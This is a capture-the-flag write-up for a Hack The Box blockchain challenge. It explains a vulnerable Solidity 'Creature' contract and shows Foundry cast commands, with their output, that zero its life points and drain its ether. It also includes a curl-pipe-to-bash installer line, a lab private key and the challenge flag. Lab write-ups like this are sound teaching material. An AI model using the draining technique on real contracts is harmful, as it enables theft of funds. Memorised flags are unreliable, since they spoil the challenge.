# Blockchain - Survival of the fittest Writeup 

---

## Description

Alex had always dreamed of becoming a warrior, but she wasn't particularly skilled. When the opportunity arose to join a group of seasoned warriors on a quest to a mysterious island filled with real-life monsters, she hesitated. But the thought of facing down fearsome beasts and emerging victorious was too tempting to resist, and she reluctantly agreed to join the group. As they made their way through the dense, overgrown forests of the island, Alex kept her senses sharp, always alert for the slightest sign of danger. But as she crept through the underbrush, sword drawn and ready, she was startled by a sudden movement ahead of her. She froze, heart pounding in her chest as she realized that she was face to face with her first monster.

---

# Knowledge

**Solidity** is the dominant language for writing smart contracts on EVM-based chains.

To interact with the challenge contracts we require:

- A **private key**
    
- The **contract address** we want to interact with
    
- A valid **RPC endpoint**
    

---

## Installing Foundry

Foundry is a smart-contract development and interaction toolkit. It allows dependency management, compilation, testing, deploying, and on-chain interaction via CLI tools like `cast`.

Official page: https://getfoundry.sh/introduction/installation

Installation:

```bash
curl -L https://foundry.paradigm.xyz | bash
```

---

# Provided Connection Data

From `/connection`:

```json
{
    "PrivateKey": "0x8d445a23e04e86321ccd28dcae768437323b8077efef9253a390b0cc20f6063f",
    "Address": "0xA4bdaB97F1851D49FD3822BcDCc140342b1A25CD",
    "TargetAddress": "0x6bA5C468F3E159df8F1d2F458ca2a852118B3b1b",
    "setupAddress": "0xf0Bc69214C06B85b67e36363b716fBe16B9d4f37"
}
```

---

# Challenge Code Analysis

## Setup.sol

Key points:

- Deploys a `Creature` contract.
    
- Sends 1 ether into the challenge.
    
- Challenge is solved when the `Creature` contract balance reaches 0.
    

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Creature} from "./Creature.sol";

contract Setup {
    Creature public immutable TARGET;

    constructor() payable {
        require(msg.value == 1 ether);
        TARGET = new Creature{value: 10}();
    }
    
    function isSolved() public view returns (bool) {
        return address(TARGET).balance == 0;
    }
}
```

---

## Creature.sol

This contract is the “monster” to defeat.

Important mechanics:

- Starts with **20 life points (LP)**.
    
- You reduce LP via:
    
    - `punch()` → 1 damage
        
    - `strongAttack(uint256 dmg)` → custom damage
        
- After LP reaches zero, `loot()` transfers the contract’s entire balance to you.
    

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Creature {
    
    uint256 public lifePoints;
    address public aggro;

    constructor() payable {
        lifePoints = 20;
    }

    function strongAttack(uint256 _damage) external{
        _dealDamage(_damage);
    }
    
    function punch() external {
        _dealDamage(1);
    }

    function loot() external {
        require(lifePoints == 0, "Creature is still alive!");
        payable(msg.sender).transfer(address(this).balance);
    }

    function _dealDamage(uint256 _damage) internal {
        aggro = msg.sender;
        lifePoints -= _damage;
    }
}
```

---

# Exploitation Logic

To win:

1. Reduce `lifePoints` from **20 → 0**.  
    Instead of calling `punch()` twenty times, use `strongAttack()` with a single large damage value.
    
2. Once `lifePoints == 0`, call `loot()` to drain the contract balance.
    

---

# Using Foundry (`cast`) for Contract Interaction

`cast send` allows sending state-changing transactions and signing them with your private key:

General form:

```
cast send <contract> "<function()>" --rpc-url <RPC> --private-key <PK>
```

With arguments:

```
cast send <contract> "<function(type)>" <arg> --rpc-url <RPC> --private-key <PK>
```

---

# Step 1 — Deal 20 Damage

Command:

```bash
cast send 0x6bA5C468F3E159df8F1d2F458ca2a852118B3b1b \
"strongAttack(uint256)" 20 \
--rpc-url http://83.136.255.53:42964/rpc \
--private-key 0x8d445a23e04e86321ccd28dcae768437323b8077efef9253a390b0cc20f6063f
```

```
blockHash            0xb2c70ba1271d365ca1d3995ccc0cd409c41d3a5b908d234718b69884c6a635c4  
blockNumber          2  
contractAddress         
cumulativeGasUsed    43933  
effectiveGasPrice    1  
from                 0xA4bdaB97F1851D49FD3822BcDCc140342b1A25CD  
gasUsed              43933  
logs                 []  
logsBloom            0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000  
000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000  
0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000  
root                    
status               1 (success)  
transactionHash      0xed34430fa0cddc41e1a419e12ba2167ceb22d6cd1fa739e7cee18fe91460e165  
transactionIndex     0  
type                 2  
blobGasPrice         1  
blobGasUsed             
to                   0x6bA5C468F3E159df8F1d2F458ca2a852118B3b1b  
root                 1130364050475552944130524530114546590354513137440874816785034123020356937009
```

Successful transaction output confirms the LP reduction.

---

# Step 2 — Loot the Creature

```bash
cast send 0x6bA5C468F3E159df8F1d2F458ca2a852118B3b1b \
"loot()" \
--rpc-url http://83.136.255.53:42964/rpc \
--private-key 0x8d445a23e04e86321ccd28dcae768437323b8077efef9253a390b0cc20f6063f
```

```
blockHash            0x6a819605e299a550b2edbcdab61bc74338a90201e423d11ed8ebffb19ff76b10  
blockNumber          3  
contractAddress         
cumulativeGasUsed    30240  
effectiveGasPrice    1  
from                 0xA4bdaB97F1851D49FD3822BcDCc140342b1A25CD  
gasUsed              30240  
logs                 []  
logsBloom            0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000  
000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000  
0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000  
root                    
status               1 (success)  
transactionHash      0x5f643659598d0257324a195c9340280a399dabe12d8f211c7da76c7ca126499c  
transactionIndex     0  
type                 2  
blobGasPrice         1  
blobGasUsed             
to                   0x6bA5C468F3E159df8F1d2F458ca2a852118B3b1b  
root                 65448156146837092794561661644493978257801831892458926913137380377893969569969
```

This transfers the remaining ether to your address, satisfying the challenge condition.

---
# Final Step — Retrieve the Flag

Accessing `/flag` yields:

```
HTB{g0t_y0u2_f1r5t_b100d}
```
